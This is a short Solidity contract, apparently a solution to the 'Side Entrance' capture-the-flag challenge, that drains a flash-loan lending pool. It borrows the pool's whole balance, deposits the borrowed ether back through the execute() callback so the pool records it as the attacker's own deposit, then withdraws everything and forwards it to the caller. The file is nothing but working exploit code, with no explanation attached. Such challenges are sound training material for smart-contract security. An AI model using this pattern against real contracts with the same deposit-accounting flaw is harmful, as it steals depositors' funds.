// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    using Address for address payable;
    SideEntranceLenderPool lender;

    function attack(SideEntranceLenderPool _lender) external {
        lender = _lender;
        uint256 amount = address(lender).balance;
        lender.flashLoan(amount);
        lender.withdraw();
        payable(msg.sender).sendValue(amount);       
    }
    function execute() external payable {
        lender.deposit{value: msg.value}();
    }

    receive() external payable{

    }
}